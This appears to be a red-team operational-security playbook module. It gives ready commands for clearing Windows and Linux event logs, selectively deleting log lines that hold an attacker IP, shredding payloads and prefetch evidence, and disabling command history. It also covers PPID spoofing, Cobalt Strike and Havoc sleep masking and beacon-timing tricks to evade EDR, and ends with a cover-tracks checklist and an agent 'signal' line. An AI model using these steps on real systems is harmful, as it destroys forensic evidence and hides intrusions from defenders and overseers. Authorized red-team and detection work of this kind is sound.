# RT12: Operational Security (OpSec)

**MITRE:** T1070, T1070.001, T1070.004, T1564, T1134.004 | **When:** Throughout engagement - maintain stealth.

## Log Clearing (T1070.001)

```powershell
# Clear Windows Event Logs (requires admin):
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Selective log clearing (remove only your events):
# Get your logon session ID first, then remove those event IDs:
$SessionID = (query session | Select-String $env:USERNAME) -replace '\s+', ' ' | ...
# More surgical: use PowerShell to filter + re-write log (not straightforward on Windows)

# Linux log cleanup:
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > ~/.bash_history && history -c
# Remove specific lines:
sed -i '/192.168.1.100/d' /var/log/auth.log

# Disable command history for current session:
unset HISTFILE       # bash
Set-PSReadLineOption -HistorySaveStyle SaveNothing  # powershell
```

## File System Cleanup (T1070.004)

```powershell
# Remove files securely (overwrite before delete):
# Windows (cipher):
cipher /w:C:\Windows\Temp  # overwrites free space in dir (slow)

# Sysinternals sdelete:
sdelete -p 3 C:\Windows\Temp\payload.exe  # 3-pass overwrite

# PowerShell secure delete:
$file = "C:\Windows\Temp\beacon.exe"
$bytes = [byte[]](Get-Random -Minimum 0 -Maximum 255 -Count (Get-Item $file).Length)
[IO.File]::WriteAllBytes($file, $bytes)
Remove-Item $file -Force

# Linux:
shred -vfz -n3 /tmp/payload
rm -rf /tmp/loot/

# Prefetch files (execution evidence):
Remove-Item "C:\Windows\Prefetch\PAYLOAD.EXE-*.pf" -Force
```

## PPID Spoofing (T1134.004)

```csharp
// Spawn process with spoofed parent to avoid EDR process-tree detection:
// CreateProcess with LPPROC_THREAD_ATTRIBUTE_LIST

// PowerShell (simplified - requires P/Invoke in practice):
// Full implementation: SelectMyParent (Didier Stevens), ppid_spoof tool

// Key Win32 API sequence:
// 1. OpenProcess(PROCESS_CREATE_PROCESS, false, parentPid) -> hParent
// 2. InitializeProcThreadAttributeList(lpAttributeList, 1, 0, lpSize)
// 3. UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hParent, ...)
// 4. CreateProcess(..., EXTENDED_STARTUPINFO_PRESENT, ..., &si, &pi)
// Result: new process appears as child of legitimate process (explorer.exe / svchost.exe)

// Cobalt Strike: spawnto sets default process for injection:
// spawnto x64 %windir%\sysnative\dllhost.exe
```

## Memory Footprint Reduction

```csharp
// Sleep mask (obfuscate beacon while sleeping):
// Cobalt Strike: sleep mask kit - encrypts in-memory beacon during sleep
// Havoc: built-in sleep obfuscation via EKKO/ZILEAN sleep mask

// Heap encryption (prevent memory scan detection):
// Encrypt heap allocations when not executing
// API: VirtualProtect(heap, size, PAGE_NOACCESS, &old) during sleep
// Restore on wake

// Stack spoofing (T1036) - hide true call stack from EDR:
// Tools: CallStackSpoofer, ThreadStackSpoofer
// Replaces real return addresses with benign-looking frames (ntdll, kernel32)
```

## Network Noise Reduction

```bash
# Slow beaconing (blend with normal traffic):
# Cobalt Strike: set sleeptime 3600000; set jitter 33;  # 1hr +-33%
# Havoc: sleep 3600 + jitter 33

# Use legitimate ports and protocols:
# Port 443 (HTTPS) + valid TLS cert (Let's Encrypt for C2 domain)
# Port 80 with HTTP profile mimicking browser traffic (User-Agent, headers)
# DNS: 60s TTL, mimic Google/MS DNS patterns

# Avoid peak detection windows:
# Don't beacon during 2-4am (anomalous for user workstation)
# Match business hours of target timezone

# Reduce lateral movement noise:
# Prefer WMI/DCOM over PSExec (no service creation events 7045)
# Use existing credentials, avoid brute force (lockout = detection)
# One target at a time, not subnet scans
```

## Cover Tracks Checklist

```bash
# Before ending op, verify:
1. All staged payloads removed from target systems
2. Persistence mechanisms removed (unless authorized for purple team)
3. Created user accounts deleted
4. Registry keys restored
5. Event logs cleared (if authorized - note: log clearing is itself logged!)
6. SSH authorized_keys entries removed
7. Cron jobs / scheduled tasks removed
8. WMI subscriptions removed:
   Get-WMIObject -Namespace root\subscription -Class __EventFilter | Remove-WMIObject
   Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WMIObject
   Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WMIObject
9. Prefetch cleaned
10. Temp files shredded
```

**Signal:** `emit_signal SURFACE_FOUND "OpSec cleanup complete on <host> - tracks covered" "main/redteam" 0.85`
